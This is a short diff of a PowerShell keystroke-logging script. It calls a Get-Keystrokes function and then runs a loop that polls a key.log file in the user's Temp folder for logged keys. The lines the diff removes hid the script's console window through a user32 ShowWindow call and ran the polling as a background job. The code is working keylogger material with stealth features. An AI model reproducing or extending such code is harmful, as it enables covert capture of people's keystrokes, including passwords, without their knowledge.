@@ -371,11 +371,6 @@ function Get-Keystrokes {
 
 Get-Keystrokes
 
-$scripp = {
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-
 while ($true){
     $key = ((gc $env:USERPROFILE\AppData\Local\Temp\key.log -Tail 1) -split ",").Trim('"')
     if ($key -ceq "c"){
@@ -384,5 +379,3 @@ while ($true){
     }
 sleep -Milliseconds 200
 }
-}
-start-job -scriptblock $scripp
